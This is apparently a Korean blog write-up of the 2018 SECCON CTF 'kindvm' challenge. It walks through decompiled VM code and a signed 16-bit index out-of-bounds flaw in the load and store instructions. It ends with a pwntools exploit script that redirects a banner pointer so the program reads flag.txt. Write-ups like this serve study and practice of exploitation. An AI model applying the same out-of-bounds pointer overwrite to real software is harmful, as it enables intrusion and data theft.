---
title: "2018 SECCON CTF kindvm"
date: 2020-7-12
ctf: SECCON CTF
layout: post
published : false
---

구조체는 이런식으로 만들었다.

```c
struct __attribute__((aligned(4))) vm
{
  int COUNT;
  int chk;
  char *name;
  char *banner;
  ssize_t (__cdecl *greeting)();
  ssize_t (__cdecl *farewell)();
};
```

ctf_setup() 함수는 그냥 버퍼 초기화해주고 alarm signal 5초 걸어놓는다.

kindvm_setup() 함수가 중요한 부분인데 vm 세팅해준다.

Input_insn() 함수는 명령어 인풋 받는 곳이다. insn이라는 포인터 전역변수에 저장해서 heap에 저장한다.

kc->greeting() 함수는 kc->banner를 열고 읽고 출력해준다.

kc->chk 즉 kindvm_setup에서 \x06을 셋팅하기 전까지 무한루프 돌아준다.

exec_insn() 함수는 1byte를 입력받아 명령어를 실행시켜줍니다.

Kc->farewell() 함수는 kc->greeting 함수포인터와 마찬가지로 kc->banner에 저장된 문자열을 파일을 열고 읽고 출력해준다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ctf_setup();
  kindvm_setup();
  input_insn();
  kc->greeting();
  while ( !kc->chk )
    exec_insn();
  kc->farewell();
  return 0;
}
```

주석으로 기능들은 설명해놨다.

```c
void *kindvm_setup()
{
  struct vm *v0; // eax
  struct vm *v1; // ebx
  void *result; // eax

  v0 = malloc(24u);
  kc = v0;
  v0->COUNT = 0;
  kc->chk = 0;
  v1 = kc;
  v1->name = input_username();
  kc->banner = "banner.txt";
  kc->greeting = func_greeting;
  kc->farewell = func_farewell;
  mem = malloc(0x400u);
  memset(mem, 0, 0x400u);
  reg = malloc(0x20u);
  memset(reg, 0, 0x20u);
  insn = malloc(0x400u);
  result = memset(mem, 'A', 0x400u);            // mem filled "A"
  nop[0] = insn_nop;                            // \x00 NOP
  load = insn_load;                             // \x01 [reg idx(1byte)] [mem idx(2byte)] mem->reg
  store = insn_store;                           // \x02 [mem idx(2byte)] [reg idx(1byte)] reg->mem
  mov = insn_mov;                               // \x03 [reg idx(1byte)] [reg idx(1byte)] reg<-reg 
  add = insn_add;                               // \x04 [reg idx(1byte)] [reg idx(1byte)] reg<-reg
  sub = insn_sub;                               // \x05 [reg idx(1byte)] [reg idx(1byte)] reg<-reg
  halt = insn_halt;                             // exit
  in = insn_in;                                 // \x07 [reg idx(1byte)] data(4byte) reg<-data
  out = insn_out;                               // \x08 [reg idx(1byte)] print
  hint = insn_hint;                             // \x09
  return result;
}
```

insn_load(\x01 [reg idx(1byte)] [mem idx(2byte)]) 함수에서 OOB 취약점이 터진다. v3를 보면 memory의 인덱스를 참조해서 주소값을 reg idx에 맞게 값을 넣어주는데 __int16으로 저장되어있다.

```c
int insn_load()
{
  int *v0; // ebx
  int result; // eax
  unsigned __int8 v2; // [esp+Dh] [ebp-Bh]
  __int16 v3; // [esp+Eh] [ebp-Ah]

  v2 = load_insn_uint8_t();
  v3 = load_insn_uint16_t();
  if ( v2 > 7u )
    kindvm_abort();
  if ( v3 > 1020 )
    kindvm_abort();
  v0 = (reg + 4 * v2);
  result = load_mem_uint32_t(v3);
  *v0 = result;
  return result;
}
```

insn_store() 함수에서도 마찬가지로 __int16 v2때문에 OOB가 터진다. heap의 원하는 주소에 mem에 reg값을 넣을 수 있다.

```c
_BYTE *insn_store()
{
  unsigned __int8 v1; // [esp+Dh] [ebp-Bh]
  __int16 v2; // [esp+Eh] [ebp-Ah]

  v2 = load_insn_uint16_t();
  v1 = load_insn_uint8_t();
  if ( v1 > 7u )
    kindvm_abort();
  if ( v2 > 1020 )
    kindvm_abort();
  return store_mem_uint32_t(v2, *(reg + v1));
}
```

익스 시나리오는 kindvm_setup() 함수에서 input_username()를 호출해준다. name에 `flag.txt` 를 적는다. 그리고 load로 OOB 취약점을 이용해서 name 영역을 참조할 수 있다. 이걸 reg[0]에 넣어준다. 무한루프가 끝나면 kc->farewell() 을 호출해주는데 이 함수에서 kc->banner에 저장된 문자열을 읽어서 출력해준다. 여기에 reg[0]를 넣는다면 kc->banner에는 &name이 저장되어 있을 것이다. \x06으로 무한루프를 끝내면 open_read_write(kc->banner)로 flag.txt를 읽을 수 있다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./kindvm')
p = process('./kindvm')
mem = 0x0804B0A0
kc = 0x0804B0E8
regs = 0x0804B0EC
insn = 0x0804B0F0

# pause()

p.sendlineafter(':','flag.txt')

pay = '\x01\x00\xff\xd8' # reg[0] = &name("flag.txt")
pay += '\x02\xff\xdc\x00' # kc->banner = reg[0]
pay += '\x06' # exit
# trigger open_read_write(kc->banner);

p.sendafter('Input instruction : ',pay)

p.interactive()
```

